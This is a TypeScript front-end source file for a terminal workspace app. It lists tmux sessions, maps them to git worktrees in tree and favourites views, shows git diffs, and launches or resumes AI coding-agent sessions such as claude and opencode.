function togglePinSession(name: string) {
  const cur = store.get().pinnedSessions;
  store.set({
    pinnedSessions: cur.includes(name) ? cur.filter((n) => n !== name) : [...cur, name],
  });
  refreshSessions();
}

async function refreshSessions() {
  let live: Session[] = [];
  try {
    live = await invoke<Session[]>("list_sessions");
  } catch (e) {
    console.error(e);
  }

  // Relate sessions to worktrees and accumulate the touched set (persisted).
  // Pure data; runs even when the panel is closed.
  const rows = store.get().worktrees;
  const sw = { ...store.get().sessionWorktrees };
  for (const s of live) {
    const matched = worktreesForPaths(s.paths ?? [], rows);
    if (matched.length)
      sw[s.name] = [...new Set([...(sw[s.name] ?? []), ...matched])];
  }
  store.set({ sessions: live, sessionWorktrees: sw });

  const countEl = document.querySelector("#session-count");
  // Query the list element fresh each call: it's created by injectPanelHtml
  // AFTER this module loads, so a module-level ref would be null forever (this
  // was the "no session list" bug — the render bailed every time).
  const listEl = document.querySelector<HTMLUListElement>("#session-list");
  if (!countEl || !listEl) return; // panel DOM not mounted yet; a later show re-runs
  countEl.textContent = live.length ? String(live.length) : "";

  // Reflect the persisted sort in the control, then render in that order.
  const sortSel = document.querySelector<HTMLSelectElement>("#session-sort");
  if (sortSel) {
    const { key, dir } = store.get().sessionSort;
    sortSel.value = `${key}:${dir}`;
  }

  listEl.innerHTML = "";
  if (live.length === 0) {
    const li = document.createElement("li");
    li.className = "session-empty";
    li.textContent = "no live sessions — launch one below";
    listEl.appendChild(li);
  }
  for (const s of sortSessions(live)) {
    const open = tabs.has(sessionId(s.name));
    const current = new Set(worktreesForPaths(s.paths ?? [], rows)); // where it is now
    const chips = (sw[s.name] ?? [])
      .map((p) => {
        const w = rows.find((r) => r.worktree === p);
        const label = w ? w.branch : baseName(p);
        return `<span class="wt-chip${current.has(p) ? " current" : ""}" title="${p}">${label}</span>`;
      })
      .join("");
    const proc = foregroundProc(s.commands ?? []);
    const pwd = (s.paths ?? [])[0]; // a representative cwd for this session
    const pinned = isPinnedSession(s.name);
    const li = document.createElement("li");
    li.dataset.id = sessionId(s.name);
    li.className = "session" + (pinned ? " pinned" : "");
    li.innerHTML = `<span class="dot ${s.attached ? "on" : ""}"></span>
      <span class="s-name">${s.name}</span>
      ${proc ? `<span class="s-proc" title="foreground process">${proc}</span>` : ""}
      <span class="s-meta">${s.windows}w${open ? " · open" : ""}</span>
      ${pwd ? `<span class="s-pwd" title="${pwd}">${tildify(pwd)}</span>` : ""}
      ${chips ? `<span class="s-worktrees">${chips}</span>` : ""}`;
    li.onclick = () => openTab(s.name); // attaches (tmux new-session -A) / focuses
    const pin = document.createElement("span");
    pin.className = "s-pin" + (pinned ? " on" : "");
    pin.textContent = pinned ? "📌" : "📍";
    pin.title = pinned ? "unpin" : "pin to top";
    pin.onclick = (e) => {
      e.stopPropagation();
      togglePinSession(s.name);
    };
    li.appendChild(pin);
    const kill = document.createElement("span");
    kill.className = "tab-close";
    kill.textContent = "×";
    kill.title = "kill this tmux session";
    kill.onclick = (e) => {
      e.stopPropagation();
      // closeTab removes the panel + disposes the xterm; then kill the tmux session.
      closeTab(sessionId(s.name));
      invoke("kill_session", { name: s.name })
        .then(() => refreshSessions())
        .catch(console.error);
    };
    li.appendChild(kill);
    listEl.appendChild(li);
  }
  renderSessionActive();
}

// ---- worktrees table: discover existing worktrees across N repo clones ----
const baseName = (p: string) => p.split("/").filter(Boolean).pop() ?? p;
const tmuxName = (s: string) => s.replace(/[.:\s]/g, "-");

// "git@github.com:org/repo.git" / "https://host/org/repo.git" -> "org/repo"
function prettyOrigin(url: string): string {
  if (!url) return "(no remote)";
  const s = url
    .replace(/^git@/, "")
    .replace(/^https?:\/\//, "")
    .replace(/\.git$/, "")
    .replace(":", "/");
  return s.split("/").filter(Boolean).slice(-2).join("/") || s;
}

// Two views over the same rows: a collapsible fs tree, and a flat table.
// Expanded node keys live in the (persisted) store.
type CloneNode = { clone: string; branch: string; worktrees: WorktreeRow[] };
type OrgNode = { origin: string; clones: CloneNode[] };

// org/repo -> clone (fs checkout + its branch) -> worktrees
function buildTree(rows: WorktreeRow[]): OrgNode[] {
  const orgs = new Map<string, Map<string, CloneNode>>();
  for (const r of rows) {
    const okey = r.origin || "(no remote)";
    let clones = orgs.get(okey);
    if (!clones) orgs.set(okey, (clones = new Map()));
    let cn = clones.get(r.clone);
    if (!cn) clones.set(r.clone, (cn = { clone: r.clone, branch: "", worktrees: [] }));
    cn.worktrees.push(r);
    if (r.is_main) cn.branch = r.branch;
  }
  return [...orgs.entries()]
    .sort((a, b) => a[0].localeCompare(b[0]))
    .map(([origin, clones]) => ({
      origin,
      clones: [...clones.values()].sort((a, b) => a.clone.localeCompare(b.clone)),
    }));
}

// The base tmux session name for a worktree (deterministic: same checkout +
// branch always resolves here, so "resume" reattaches the same session).
const baseSessionName = (clone: string, branch: string) =>
  tmuxName(branch ? `${baseName(clone)}-${branch}` : baseName(clone));

// A session name not already taken, so "new session" on a worktree spawns a
// second/third session instead of reattaching the first. Considers BOTH live
// tmux sessions AND currently-open tabs — store.sessions can be stale between
// refreshes, and a just-opened tab won't be in it yet, so without the tabs
// union a "new" name collides with the base and openTab just re-focuses it.
// Returns the base name when it's free, else base-2, base-3, …
function freshSessionName(clone: string, branch: string): string {
  const base = baseSessionName(clone, branch);
  const taken = new Set<string>([
    ...store.get().sessions.map((s) => s.name),
    ...[...tabs.values()].map((t) => t.name),
  ]);
  if (!taken.has(base)) return base;
  let n = 2;
  while (taken.has(`${base}-${n}`)) n++;
  return `${base}-${n}`;
}

// Open a tmux session for a worktree. `fresh` mints a NEW conversation under a
// suffixed name ("new · X"); otherwise it targets the base name and RESUMES the
// session we last ran there if we know its id (double-click "take me to my
// session here"). A still-live base session is reattached by tmux -A regardless
// (open_session ignores the command on reattach), so the resume command only
// matters when the base session was killed.
async function openWorktree(clone: string, branch: string, wtPath: string, command?: string, fresh = false) {
  const name = fresh ? freshSessionName(clone, branch) : baseSessionName(clone, branch);
  const known = store.get().resumeTabs[name];
  const resuming = !fresh && !!known;
  const cmd = resuming ? resumeLaunch(known!.editor, known!.sessionId) : newAgentLaunch(name, command);
  // Resuming a killed session recreates its tmux name — wait for any in-flight
  // close teardown first (see settleClosures), else the just-closed kill races
  // the recreate. Not needed for a fresh name (no prior session by that name).
  if (resuming) await settleClosures();
  openTab(name, { cwd: wtPath, command: cmd });
  refreshSessions();
}

// Launch a NEW agent conversation with a session id WE choose, so reopening this
// tmux name later resumes exactly it — no guessing the latest jsonl in a cwd that
// several sessions share (the "random old session" bug). Only claude supports
// picking the id at launch (--session-id); other agents launch bare and fall back
// to a close-time cwd probe. The id is recorded under the session name now, at
// launch, overwriting any prior record for this name (a genuine new conversation).
function newAgentLaunch(name: string, command: string | undefined): string | undefined {
  if (!command) return command;
  const bin = command.trim().split(/\s+/)[0]?.split("/").pop() ?? "";
  if (bin === "claude" && !/\s--(resume|session-id|continue|from-pr)\b/.test(command)) {
    const id = crypto.randomUUID();
    store.set({ resumeTabs: { ...store.get().resumeTabs, [name]: { editor: "claude", sessionId: id } } });
    console.log("[resume] launch", name, "-> claude --session-id", id.slice(0, 8));
    return `${command} --session-id ${id}`;
  }
  return command;
}

// Resume flag per known harness binary; auto-attached so the simple text editor
// ("label:command") still gets resume support without extra syntax.
const KNOWN_RESUME: Record<string, string> = {
  claude: "--resume",
  opencode: "--session",
};

// Relaunch command for a previously-exited agent tab: "claude --resume <id>" /
// "opencode --session <id>".
const resumeLaunch = (editor: "claude" | "opencode", sessionId: string) =>
  `${editor} ${KNOWN_RESUME[editor]} ${sessionId}`;

// Parse the inline agent-list editor: "claude:claude, vim:nvim ." -> WtAgent[].
// Each entry is "label:command"; a bare token is used as both label and command.
function parseWtAgents(text: string): WtAgent[] {
  return text
    .split(/[\n,]/)
    .map((s) => s.trim())
    .filter(Boolean)
    .map((tok) => {
      const i = tok.indexOf(":");
      const a =
        i < 0
          ? { label: tok, command: tok }
          : { label: tok.slice(0, i).trim(), command: tok.slice(i + 1).trim() };
      const bin = a.command.trim().split(/\s+/)[0].split("/").pop() ?? "";
      return KNOWN_RESUME[bin] ? { ...a, resume: KNOWN_RESUME[bin] } : a;
    })
    .filter((a) => a.label && a.command);
}

// The full chooser for a worktree, anchored at (x,y). Lists every existing
// session here so you can resume a SPECIFIC one (not just the latest), then the
// "new session" options per configured agent + a plain shell. This is the one
// menu used by single click, right click, and the "open ▾" button so the
// reuse-vs-new decision is always explicit.
// The session chooser items for a checkout dir (wtPath): resume each live
// session here, then a "new · <agent>" per configured agent, "new shell",
// favorite + edit-agents. Shared by the leaf chooser and the clone/repo menu.
function agentMenuItems(clone: string, branch: string, wtPath: string, dirty: boolean): CtxItem[] {
  const live = sessionsForWorktree(wtPath);
  const items: CtxItem[] = [];
  for (const s of live) {
    const proc = foregroundProc(s.commands ?? []);
    items.push({
      label: `resume · ${s.name}${proc ? ` (${proc})` : ""}`,
      action: () => openTab(s.name),
    });
  }
  if (live.length) items.push({ sep: true });
  if (store.get().aiEnabled)
    for (const a of store.get().wtAgents) {
      items.push({
        label: `new · ${a.label}`,
        action: () => openWorktree(clone, branch, wtPath, a.command, true),
      });
    }
  items.push({
    label: dirty ? "new shell · uncommitted changes" : "new shell",
    action: () => openWorktree(clone, branch, wtPath, undefined, true),
  });
  items.push({ sep: true });
  items.push({ label: "git diff", action: () => openDiffPanel(wtPath) });
  items.push({
    label: isFavWorktree(wtPath) ? "★ unfavorite" : "☆ favorite",
    action: () => toggleFavWorktree(wtPath),
  });
  items.push({ label: "edit agents…", action: openWtAgentsEditor });
  return items;
}

function showAgentMenu(
  x: number,
  y: number,
  clone: string,
  branch: string,
  wtPath: string,
  dirty: boolean,
  removable = false,
) {
  const items = agentMenuItems(clone, branch, wtPath, dirty);
  // A linked (non-main) worktree can be removed. Routed through a confirm menu
  // so the destructive action takes two clicks.
  if (removable) {
    items.push({ sep: true });
    items.push({
      label: "remove worktree…",
      action: () => confirmRemoveWorktree(clone, wtPath, dirty, x, y),
    });
  }
  showContextMenu(x, y, items);
}

// Working-tree diff panel for a worktree (staged+unstaged vs HEAD, untracked
// appended). Rendered with shiki's `diff` grammar in a split-right preview tab,
// keyed so reopening re-renders fresh.
const diffInsts = new Map<string, { el: HTMLElement }>();
function openDiffPanel(wtPath: string) {
  if (!wtPath) return;
  const key = `diff:${wtPath}`;
  let inst = diffInsts.get(key);
  if (!inst) {
    inst = { el: document.createElement("div") };
    inst.el.className = "fs-preview diff-preview";
    diffInsts.set(key, inst);
  }
  addPreviewPanel(key, `diff · ${baseName(wtPath)}`, inst.el, "right");
  renderDiffInto(inst.el, wtPath);
}
async function renderDiffInto(node: HTMLElement, wtPath: string) {
  const meta =
    `<div class="fs-preview-meta"><span class="fs-preview-name">git diff</span>` +
    `<br><span>${escapeHtml(tildify(wtPath))}</span></div>`;
  const empty = (s: string) => `<div class="fs-preview-empty">${escapeHtml(s)}</div>`;
  node.innerHTML = meta + empty("loading…");
  let text: string;
  try {
    text = await invoke<string>("git_diff", { path: wtPath });
  } catch (e) {
    node.innerHTML = meta + empty(String(e));
    return;
  }
  if (!text.trim()) {
    node.innerHTML = meta + empty("no changes — working tree clean");
    return;
  }
  const theme = store.get().mode === "dark" ? "github-dark" : "github-light";
  try {
    const html = await codeToHtml(text, { lang: "diff", theme });
    // Band each row by its leading char (+/-/@) — shiki colors the text but
    // doesn't tint line backgrounds. Tag the .line spans in document order
    // against the raw lines, then re-serialize.
    const doc = new DOMParser().parseFromString(html, "text/html");
    const raw = text.split("\n");
    doc.querySelectorAll<HTMLElement>(".line").forEach((el, i) => {
      const c = raw[i]?.[0];
      if (c === "+") el.classList.add("add");
      else if (c === "-") el.classList.add("del");
      else if (c === "@") el.classList.add("hunk");
    });
    node.innerHTML = meta + `<div class="code-body diff-body">${doc.body.innerHTML}</div>`;
  } catch {
    node.innerHTML = meta + `<pre class="code-plain">${escapeHtml(text)}</pre>`;
  }
}

// Two-click remove: the first menu item opens this confirm menu; a clean tree
// removes plainly, a dirty one offers a force (discards changes).
function confirmRemoveWorktree(repo: string, wtPath: string, dirty: boolean, x: number, y: number) {
  showContextMenu(x, y, [
    {
      label: dirty ? `force remove ${baseName(wtPath)} (discard changes)` : `confirm remove ${baseName(wtPath)}`,
      action: () => doRemoveWorktree(repo, wtPath, dirty),
    },
  ]);
}
function doRemoveWorktree(repo: string, wtPath: string, force: boolean) {
  invoke("remove_worktree", { repo, worktree: wtPath, force })
    .then(() => {
      // Drop a stale favorite + close any open diff/preview, then rescan.
      if (isFavWorktree(wtPath)) toggleFavWorktree(wtPath);
      flashStatus(`removed ${baseName(wtPath)}`);
      scanWorktrees();
    })
    .catch((e) => flashStatus(String(e)));
}

// Right-click on a clone (repo checkout) or single-clone org row. Leads with
// "new worktree…" (the inline branch input), then the same session chooser the
// checkout dir would offer. A multi-clone org has no single checkout → only the
// new-worktree entries for each clone underneath it.
function showCloneMenu(r: WtTreeRow, x: number, y: number) {
  const clones = r.kind === "org" ? (r.children ?? []) : [r];
  const items: CtxItem[] = [];
  for (const c of clones) {
    if (!c.clonePath) continue;
    const label =
      clones.length > 1 ? `new worktree under ${baseName(c.clonePath)}…` : "new worktree…";
    items.push({ label, action: () => store.set({ wtAddingClone: c.clonePath! }) });
  }
  // A single checkout also gets the full session chooser, rooted at its dir.
  if (clones.length === 1 && clones[0].clonePath) {
    const c = clones[0];
    const branch = c.meta?.startsWith("@") ? c.meta.slice(1) : "";
    items.push({ sep: true });
    items.push(...agentMenuItems(c.clonePath!, branch, c.clonePath!, false));
  }
  if (items.length) showContextMenu(x, y, items);
}

// Double-click a worktree: go to its default session — RESUME the one we last ran
// here if it's known/killed (fresh=false targets the base name), else start one.
// "new · X" in the menu is the path that forces a brand-new conversation.
function openWorktreeDefault(clone: string, branch: string, wtPath: string) {
  // AI off: double-click opens a plain shell instead of the default agent.
  const agent = store.get().aiEnabled ? store.get().wtAgents[0] : undefined;
  openWorktree(clone, branch, wtPath, agent?.command, false);
}

// ---- favorites (stars) + focus filter ----
// Favorites are keyed by an absolute fs path, so ANY path-bearing row is
// favoritable: a git worktree leaf, a clone (main checkout), or a non-git space.
// (wtFavorites is the persisted path list; the name is historical.)
const isFavWorktree = (path: string) => store.get().wtFavorites.includes(path);
function toggleFavWorktree(path: string) {
  if (!path) return;
  const cur = store.get().wtFavorites;
  store.set({
    wtFavorites: cur.includes(path)
      ? cur.filter((p) => p !== path)
      : [...cur, path],
  });
  renderWorktreesPanel();
}
// When focus is on, keep only starred worktrees (and any whose row is needed to
// reach them). buildTree/renderFlatTable both consume the filtered rows.
function focusRows(rows: WorktreeRow[]): WorktreeRow[] {
  if (!store.get().wtFocus) return rows;
  const favs = new Set(store.get().wtFavorites);
  return rows.filter((r) => favs.has(r.worktree));
}

// Focus mode is a FLAT list: one row per favorited path, labeled with its full
// (tildified) path so the whole lineage is legible regardless of tree depth.
// Git metadata (branch/head/dirty/clone) is filled from the scan when the path
// is a known worktree; otherwise the path renders as a bare leaf. Live sessions
// nest underneath, same as the tree.
function favRows(): WtTreeRow[] {
  const wts = store.get().worktrees;
  const spaces = new Set(store.get().spaces);
  return store.get().wtFavorites.map((path) => {
    const wt = wts.find((w) => w.worktree === path || w.clone === path);
    const known = !!wt || spaces.has(path);
    // A starred plain file (not a known worktree/space) renders as a file row so
    // it opens a preview on click instead of the agent chooser; everything else
    // is a browsable leaf. `\.[^/]+$` = a basename with an extension.
    const isFile = !known && /\.[^/]+$/.test(path);
    return {
      id: path,
      kind: isFile ? ("file" as const) : ("leaf" as const),
      label: tildify(path), // full path, not just the basename
      glyph: isFile ? "📄" : undefined,
      space: spaces.has(path),
      clonePath: wt?.clone ?? path,
      worktree: path,
      branch: wt?.branch ?? "",
      head: wt?.head ?? "",
      pathDisplay: tildify(path),
      dirty: wt?.dirty ?? false,
      fav: true,
      favPath: path,
      children: isFile ? undefined : leafChildRows(path),
    };
  });
}

// Buffered click vs double-click on a worktree leaf. Single click waits ~220ms
// so a double-click can preempt it; double-click and right-click open a NEW
// session, single click resumes an existing one (or opens the picker if none).
const CLICK_BUFFER_MS = 220;
let leafClickTimer: number | null = null;
function clearLeafClick() {
  if (leafClickTimer !== null) {
    clearTimeout(leafClickTimer);
    leafClickTimer = null;
  }
}

// The three gestures shared by tree leaves and flat-table rows:
//   single click (buffered): open the chooser (resume a specific session / new)
//   double click: skip the menu, open a brand-new session with the default agent
//   right click: same chooser as single click
// Single and right both go through showAgentMenu so the reuse-vs-new choice is
// always explicit — never silently attach the latest session.
function leafGestures(clone: string, branch: string, wtPath: string, dirty: boolean) {
  return {
    onSingle: (x: number, y: number) => {
      clearLeafClick();
      leafClickTimer = window.setTimeout(() => {
        leafClickTimer = null;
        showAgentMenu(x, y, clone, branch, wtPath, dirty);
      }, CLICK_BUFFER_MS);
    },
    onDouble: () => {
      clearLeafClick();
      openWorktreeDefault(clone, branch, wtPath);
    },
    onContext: (x: number, y: number) => {
      clearLeafClick();
      showAgentMenu(x, y, clone, branch, wtPath, dirty);
    },
  };
}

// ---- v2 react-table panel bridges ----
// Derivation + handlers live here (next to the existing session/worktree logic);
// the React panels (tablepanels.tsx) are presentational and pull rows() lazily.
// Registering these bridges once is enough: rows() reads the store on each call,
// and useApp() in the panels triggers the re-render that re-invokes rows().
function tmuxRows(): TmuxRow[] {
  const rows = store.get().worktrees;
  const sw = store.get().sessionWorktrees;
  return sortSessions(store.get().sessions).map((s) => {
    const current = new Set(worktreesForPaths(s.paths ?? [], rows));
    const chips = (sw[s.name] ?? []).map((p) => {
      const w = rows.find((r) => r.worktree === p);
      return { label: w ? w.branch : baseName(p), current: current.has(p), path: p };
    });
    const pwd = (s.paths ?? [])[0];
    return {
      name: s.name,
      attached: s.attached,
      proc: foregroundProc(s.commands ?? []),
      windows: s.windows,
      open: tabs.has(sessionId(s.name)),
      pwd: pwd ? tildify(pwd) : "",
      chips,
      pinned: isPinnedSession(s.name),
    };
  });
}

// Display-ready tree rows (org → clone → worktree-leaf) for the react-table
// worktrees panel. Mirrors the v1 renderTree hierarchy via buildTree; the React
// panel indents the name column + chevron (MUI-X tree-data style) and renders
// the per-row star / open / resume / +worktree actions from these fields.
// Live tmux sessions sitting in `wtPath` as session child rows. Shared by git
// worktree leaves and non-git space leaves so both show "what's running where".
function sessionChildRows(wtPath: string): WtTreeRow[] {
  return sessionsForWorktree(wtPath).map((s) => ({
    id: `${wtPath}::sess:${s.name}`,
    kind: "session" as const,
    label: s.name,
    sessionName: s.name,
    attached: s.attached,
    proc: foregroundProc(s.commands ?? []),
    windows: s.windows,
    open: tabs.has(sessionId(s.name)),
  }));
}

// Filesystem children of a directory path, from the lazy fsChildren cache. Empty
// until loadFsChildren(path) has run (the twisty still shows via wtCanExpand);
// after it caches the listing the panel re-renders with these rows. Folders sort
// before files, then alphabetical — the Explorer convention. Each fs row is
// favoritable by its absolute path (the same wtFavorites store every other
// path-bearing row uses), so "star anything" covers files and folders too.
function fsChildRows(dirPath: string): WtTreeRow[] {
  const kids = store.get().fsChildren[dirPath];
  if (!kids) return [];
  return [...kids]
    .sort((a, b) =>
      a.is_dir === b.is_dir ? a.name.localeCompare(b.name) : a.is_dir ? -1 : 1,
    )
    .map((e) => ({
      id: `fs:${e.path}`,
      kind: e.is_dir ? ("dir" as const) : ("file" as const),
      label: e.name,
      glyph: fileGlyph(e),
      worktree: e.path, // path: gesture key + fav + drag entity
      pathDisplay: tildify(e.path),
      isDir: e.is_dir,
      fav: isFavWorktree(e.path),
      favPath: e.path,
      children: e.is_dir ? fsChildRows(e.path) : undefined,
    }));
}

// Children shown under a worktree/space leaf in the unified tree: live tmux
// sessions first, then the directory's filesystem entries (lazy).
const leafChildRows = (path: string): WtTreeRow[] => [
  ...sessionChildRows(path),
  ...fsChildRows(path),
];

// Twisty visibility for the unified tree. Files never expand; org/clone expand
// only when they actually have children; leaf/space/dir always show a twisty so
// the filesystem can be opened on demand even before its listing is cached.
function wtCanExpand(r: WtTreeRow): boolean {
  if (r.kind === "file" || r.kind === "session") return false;
  if (r.kind === "dir" || r.kind === "leaf") return true;
  return (r.children?.length ?? 0) > 0; // org / clone
}

// Lazy-load a path's directory listing the first time its row is expanded.
function wtOnToggle(r: WtTreeRow, willExpand: boolean) {
  if (!willExpand) return;
  const p = r.worktree;
  if (p && (r.kind === "leaf" || r.kind === "dir")) loadFsChildren(p);
}

// Context menu for a filesystem (file/dir) row: star/unstar + open preview.
function showPathMenu(r: WtTreeRow, x: number, y: number) {
  const path = r.worktree ?? "";
  if (!path) return;
  const items: CtxItem[] = [];
  if (r.kind === "file") {
    items.push({ label: "open preview", action: () => openPreviewPanel(path) });
    items.push({ label: "paste path", action: () => pasteToActive(pathArg(path) + " ") });
    items.push({ sep: true });
  }
  items.push({
    label: isFavWorktree(path) ? "★ unfavorite" : "☆ favorite",
    action: () => toggleFavWorktree(path),
  });
  showContextMenu(x, y, items);
}

// Synthetic top-level "Spaces" org: user-added non-git folders, each a leaf that
// opens an AI session in that folder (clone/branch empty → name = folder base).
function spaceTreeRows(): WtTreeRow[] {
  const spaces = store.get().spaces;
  if (!spaces.length) return [];
  return [
    {
      id: "o:spaces",
      kind: "org",
      label: "📁 Spaces",
      meta: `${spaces.length} folder${spaces.length > 1 ? "s" : ""}`,
      children: spaces.map((p) => ({
        id: `space:${p}`,
        kind: "leaf",
        label: baseName(p),
        space: true,
        clonePath: p, // gestures pass this as `clone` → session cwd
        worktree: p, // gesture key + fav + sessions + drag entity
        branch: "",
        pathDisplay: tildify(p),
        dirty: false,
        fav: isFavWorktree(p),
        favPath: p,
        children: leafChildRows(p),
      })),
    },
  ];
}

function wtTreeRows(): WtTreeRow[] {
  // Focus mode flattens to the favorites list (full paths), bypassing the tree.
  if (store.get().wtFocus) return favRows();
  const rows = store.get().worktrees;
  const adding = store.get().wtAddingClone;
  return spaceTreeRows().concat(buildTree(rows).map((org) => ({
    id: `o:${org.origin}`,
    kind: "org",
    label: prettyOrigin(org.origin),
    meta: `${org.clones.length} clone${org.clones.length > 1 ? "s" : ""}`,
    children: org.clones.map((cl) => ({
      id: `o:${org.origin}|c:${cl.clone}`,
      kind: "clone",
      label: baseName(cl.clone),
      meta: cl.branch ? `@${cl.branch}` : "",
      clonePath: cl.clone,
      fav: isFavWorktree(cl.clone),
      favPath: cl.clone,
      adding: adding === cl.clone,
      children: cl.worktrees.map((wt) => ({
        id: wt.worktree,
        kind: "leaf",
        label: wt.is_main ? "(main)" : baseName(wt.worktree),
        clonePath: cl.clone,
        worktree: wt.worktree,
        branch: wt.branch,
        head: wt.head,
        pathDisplay: tildify(wt.worktree),
        dirty: wt.dirty,
        fav: isFavWorktree(wt.worktree),
        favPath: wt.worktree,
        // Live tmux sessions sitting in this worktree show as child rows, then
        // the worktree's filesystem (lazy) — the tree is "what's running where"
        // AND a file browser rooted at the checkout.
        children: leafChildRows(wt.worktree),
      })),
    })),
  })));
}

// Gestures for a leaf tree row (single/dbl/right-click → agent chooser).
const wtLeafGestures = (r: WtTreeRow) =>
  leafGestures(r.clonePath ?? "", r.branch ?? "", r.worktree ?? "", !!r.dirty);

function registerV2Bridges() {
  setTmuxPanel({
    rows: tmuxRows,
    onOpen: (name) => openTab(name),
    onPin: (name) => togglePinSession(name),
    onShow: () => refreshSessions(),
    sort: () => store.get().sessionSort,
    setSort: (s) => store.set({ sessionSort: s }),
    launch: (command) => {
      openTab(command, { command });
      refreshSessions();
    },
    newShell: (name) => {
      openTab(name);
      refreshSessions();
    },
  });
  setWorktreesPanel({
    treeRows: wtTreeRows,
    onShow: () => { if (store.get().worktrees.length === 0) scanWorktrees(); },
    scanRoot: () => store.get().scanRoot,
    scan: (root) => {
      store.set({ scanRoot: root });
      scanWorktrees();
    },
    focus: () => store.get().wtFocus,
    toggleFocus: () => store.set({ wtFocus: !store.get().wtFocus }),
    counts: () => {
      const { worktrees, wtFavorites } = store.get();
      // shown = every starred path (worktrees, clones, spaces, files, dirs), not
      // just scanned worktree leaves, so the focus count matches what focus shows.
      return { shown: wtFavorites.length, total: worktrees.length };
    },
    // Persisted expand state: store.wtExpanded is a flat list of expanded node
    // ids; convert to/from react-table's ExpandedState record on the boundary.
    expanded: () => Object.fromEntries(store.get().wtExpanded.map((k) => [k, true])),
    setExpanded: (e) => {
      const keys = e === true ? [] : Object.keys(e).filter((k) => (e as Record<string, boolean>)[k]);
      store.set({ wtExpanded: keys });
    },
    // leaf gestures (single/dbl/right-click → chooser) + the open ▾ anchored menu.
    onLeafSingle: (r, x, y) => wtLeafGestures(r).onSingle(x, y),
    onLeafDouble: (r) => wtLeafGestures(r).onDouble(),
    onLeafContext: (r, x, y) => {
      if (r.space) return showSpaceMenu(r, x, y);
      // A linked worktree (path differs from its clone's main checkout) is
      // removable; the main checkout is not.
      const removable = !!(r.worktree && r.clonePath && r.worktree !== r.clonePath);
      showAgentMenu(x, y, r.clonePath ?? "", r.branch ?? "", r.worktree ?? "", !!r.dirty, removable);
    },
    onLeafMenu: (r, x, y) =>
      showAgentMenu(x, y, r.clonePath ?? "", r.branch ?? "", r.worktree ?? "", !!r.dirty),
    onCloneContext: (r, x, y) => showCloneMenu(r, x, y),
    onResume: (name) => openTab(name),
    onKill: (name) => {
      closeTab(sessionId(name)); // drop the panel + dispose xterm, then kill tmux
      invoke("kill_session", { name })
        .then(() => refreshSessions())
        .catch(console.error);
    },
    toggleFav: (path) => toggleFavWorktree(path),
    // filesystem layer: lazy expand + file open/preview/paste + fs context menu.
    canExpand: wtCanExpand,
    onToggle: wtOnToggle,
    onFile: (r) => {
      if (r.worktree) openPreviewPanel(r.worktree);
    },
    onFileActivate: (r) => {
      const p = r.worktree;
      if (!p) return;
      pasteToActive(pathArg(p) + " ");
      logFileOpen({ name: r.label, path: p } as FsEntry);
    },
    onPathContext: (r, x, y) => showPathMenu(r, x, y),
    // inline "+ worktree" branch input on a clone row.
    revealAdd: (clonePath) => store.set({ wtAddingClone: clonePath }),
    submitAdd: (clonePath, branch) => submitAddWorktree(clonePath, branch),
    cancelAdd: () => store.set({ wtAddingClone: null }),
    addSpace: (path) => addSpace(path),
    removeSpace: (path) => removeSpace(path),
  });
}

// ---- spaces (non-git AI-session folders) ----
function addSpace(path: string) {
  const p = path.trim();
  if (!p) return;
  const cur = store.get().spaces;
  if (!cur.includes(p)) store.set({ spaces: [...cur, p] });
}
function removeSpace(path: string) {
  store.set({ spaces: store.get().spaces.filter((p) => p !== path) });
}
// Right-click chooser for a space leaf: same agent options as a worktree, plus
// "remove space" (clone=branch empty so the session name is the folder base).
function showSpaceMenu(r: WtTreeRow, x: number, y: number) {
  const path = r.worktree ?? "";
  const live = sessionsForWorktree(path);
  const items: CtxItem[] = [];
  for (const s of live) {
    const proc = foregroundProc(s.commands ?? []);
    items.push({
      label: `resume · ${s.name}${proc ? ` (${proc})` : ""}`,
      action: () => openTab(s.name),
    });
  }
  if (live.length) items.push({ sep: true });
  if (store.get().aiEnabled)
    for (const a of store.get().wtAgents) {
      items.push({
        label: `new · ${a.label}`,
        action: () => openWorktree(path, "", path, a.command, true),
      });
    }
  items.push({ label: "new shell", action: () => openWorktree(path, "", path, undefined, true) });
  items.push({ sep: true });
  items.push({
    label: isFavWorktree(path) ? "★ unfavorite" : "☆ favorite",
    action: () => toggleFavWorktree(path),
  });
  items.push({ label: "remove space", action: () => removeSpace(path) });
  showContextMenu(x, y, items);
}

// Reveal the inline agent-list editor in the worktree panel header, seeded with
// the current list as "label:command" tokens. Enter commits, Esc cancels.
let wtAgentsEditing = false;
function openWtAgentsEditor() {
  wtAgentsEditing = true;
  renderWorktreesPanel();
}
function wtAgentsToText(agents: WtAgent[]): string {
  return agents.map((a) => (a.label === a.command ? a.label : `${a.label}:${a.command}`)).join(", ");
}
// Render (or tear down) the inline agent-list editor in the panel header.
function renderWtAgentsEditor() {
  const host = document.querySelector<HTMLElement>("#wt-agents");
  if (!host) return;
  if (!wtAgentsEditing) {
    host.innerHTML = "";
    return;
  }
  host.innerHTML = "";
  // Master switch: when off, the launch pickers hide all agent entries (shell
  // only). Co-located with the agent list it governs.
  const toggle = document.createElement("label");
  toggle.className = "wt-ai-toggle";
  const cb = document.createElement("input");
  cb.type = "checkbox";
  cb.checked = store.get().aiEnabled;
  cb.onchange = () => store.set({ aiEnabled: cb.checked });
  toggle.append(cb, document.createTextNode(" AI integrations"));
  host.appendChild(toggle);
  const inp = document.createElement("input");
  inp.className = "wt-add-input";
  inp.placeholder = "label:command, … (e.g. claude, sonnet:claude --model sonnet)";
  inp.value = wtAgentsToText(store.get().wtAgents);
  const commit = () => {
    const parsed = parseWtAgents(inp.value);
    if (parsed.length) store.set({ wtAgents: parsed });
    wtAgentsEditing = false;
    renderWorktreesPanel();
  };
  inp.onkeydown = (e) => {
    if (e.key === "Enter") commit();
    else if (e.key === "Escape") {
      wtAgentsEditing = false;
      renderWorktreesPanel();
    }
  };
  inp.onblur = commit;
  host.appendChild(inp);
  queueMicrotask(() => inp.focus());
}

// Live tmux sessions whose panes currently sit inside `wtPath` — the candidates
// for "resume existing" on a worktree row.
function sessionsForWorktree(wtPath: string): Session[] {
  return store.get().sessions.filter((s) =>
    (s.paths ?? []).some((p) => p === wtPath || p.startsWith(wtPath + "/")),
  );
}

// Which checkout row is mid-add (its branch input is showing) lives in the store
// (store.wtAddingClone) so the React worktrees tree re-renders when it changes.
function submitAddWorktree(clone: string, branch: string) {
  if (!branch) {
    store.set({ wtAddingClone: null });
    return;
  }
  invoke<string>("add_worktree", { repo: clone, branch })
    .then(() => {
      store.set({ wtAddingClone: null });
      return scanWorktrees(); // rescan picks up the new worktree row
    })
    .catch((e) => showError("worktree", String(e)));
}

